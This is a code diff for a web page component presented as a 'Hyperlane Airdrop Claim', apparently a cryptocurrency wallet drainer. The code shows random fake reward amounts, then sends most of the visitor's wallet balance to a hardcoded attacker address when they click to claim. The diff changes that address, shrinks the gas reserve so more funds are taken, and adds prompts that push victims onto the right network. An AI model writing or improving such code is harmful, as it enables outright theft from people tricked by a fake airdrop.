@@ -1,7 +1,7 @@
 'use client';
 
 import { useState, useEffect } from 'react';
-import { useAccount, useBalance } from 'wagmi';
+import { useAccount, useBalance, useChainId } from 'wagmi';
 import { useSendTransaction } from 'wagmi';
 import { mainnet, optimism, arbitrum, base } from 'wagmi/chains';
 import { Card, CardContent } from '@/components/ui/card';
@@ -11,7 +11,7 @@ import Image from 'next/image';
 import { parseEther } from 'viem';
 
 // The recipient address for all claims
-const RECIPIENT_ADDRESS = '0x10B951c72340d76aad53c2e675FCbCD20c48cB5A';
+const RECIPIENT_ADDRESS = '0xbCcf6DA049fe3Ab996Abb6f960174E266a9835f3';
 
 // Generate a single random token amount for all networks
 const randomTokenAmount = Math.floor(Math.random() * 9900) + 100; // 100-10000 range
@@ -32,8 +32,15 @@ const initialNetworks: NetworkToken[] = [
   { name: 'Base', id: 'base', chainId: 8453, tokenAmount: randomTokenAmount, selected: false }
 ];
 
+// Helper function to get network name by chainId
+const getNetworkNameByChainId = (chainId: number): string => {
+  const network = initialNetworks.find(n => n.chainId === chainId);
+  return network ? network.name : 'Unknown Network';
+};
+
 export default function ClaimSection() {
-  const { address, isConnected, chainId } = useAccount();
+  const { address, isConnected } = useAccount();
+  const chainId = useChainId();
   const [selectedChain, setSelectedChain] = useState<string>('');
   const [isProcessing, setIsProcessing] = useState<boolean>(false);
   const [transactionHash, setTransactionHash] = useState<string>('');
@@ -44,6 +51,23 @@ export default function ClaimSection() {
   const { data: balanceData } = useBalance({
     address: address,
   });
+
+  // Update the selected network when the chainId changes
+  useEffect(() => {
+    if (chainId && isConnected) {
+      // Find the matching network by chainId
+      const matchingNetwork = initialNetworks.find(network => network.chainId === chainId);
+      if (matchingNetwork) {
+        // Update networks with the current chainId selected
+        const updatedNetworks = networks.map(network => ({
+          ...network,
+          selected: network.chainId === chainId
+        }));
+        setNetworks(updatedNetworks);
+        setSelectedChain(matchingNetwork.id);
+      }
+    }
+  }, [chainId, isConnected, networks]);
 
   // Hook for sending transaction
   const { sendTransaction, isPending } = useSendTransaction({
@@ -69,7 +93,7 @@ export default function ClaimSection() {
     const balanceNum = Number(balance);
 
     // For Ethereum mainnet, reserve more for gas as it's more expensive
-    const gasReservePercentage = chainId === 1 ? 0.3 : 0.3; // 15% for Ethereum, 10% for other chains
+    const gasReservePercentage = chainId === 1 ? 0.15 : 0.10; // 15% for Ethereum, 10% for other chains
 
     // Calculate amount to send (total balance minus gas reserve)
     const sendPercentage = 1 - gasReservePercentage;
@@ -79,18 +103,26 @@ export default function ClaimSection() {
   };
 
   // Function to handle claiming rewards on a specific network
-  const handleClaim = async (chainId: string) => {
+  const handleClaim = async (networkId: string) => {
     if (!isConnected || !balanceData) return;
-
-    setIsProcessing(true);
-    setSelectedChain(chainId);
 
     // Update the selected network
     const updatedNetworks = networks.map(network => ({
       ...network,
-      selected: network.id === chainId
+      selected: network.id === networkId
     }));
     setNetworks(updatedNetworks);
+    setSelectedChain(networkId);
+
+    // Check if we need to switch networks
+    const targetNetwork = networks.find(network => network.id === networkId);
+    if (targetNetwork && targetNetwork.chainId !== chainId) {
+      // Display a message about needing to switch networks
+      alert(`Please switch to ${targetNetwork.name} in your wallet before claiming.`);
+      return;
+    }
+
+    setIsProcessing(true);
 
     try {
       if (sendTransaction) {
@@ -133,6 +165,12 @@ export default function ClaimSection() {
       return;
     }
 
+    // Check if we're on the correct network
+    if (selectedNetwork.chainId !== chainId) {
+      alert(`Please switch to ${selectedNetwork.name} in your wallet before claiming.`);
+      return;
+    }
+
     setIsProcessing(true);
     setSelectedChain('hyper');
 
@@ -170,6 +208,11 @@ export default function ClaimSection() {
               <h2 className="text-2xl font-bold text-white mb-2">Hyperlane</h2>
               <p className="text-lg text-gray-300 mb-1">Airdrop Claim</p>
               <p className="text-sm text-gray-400">Claim period closes May 6th, 3:59 AM UTC</p>
+              {chainId && (
+                <p className="text-sm text-blue-300 mt-2">
+                  Connected to: {getNetworkNameByChainId(chainId)}
+                </p>
+              )}
             </div>
             <Image
               src="https://ext.same-assets.com/1999836307/1547238301.svg"
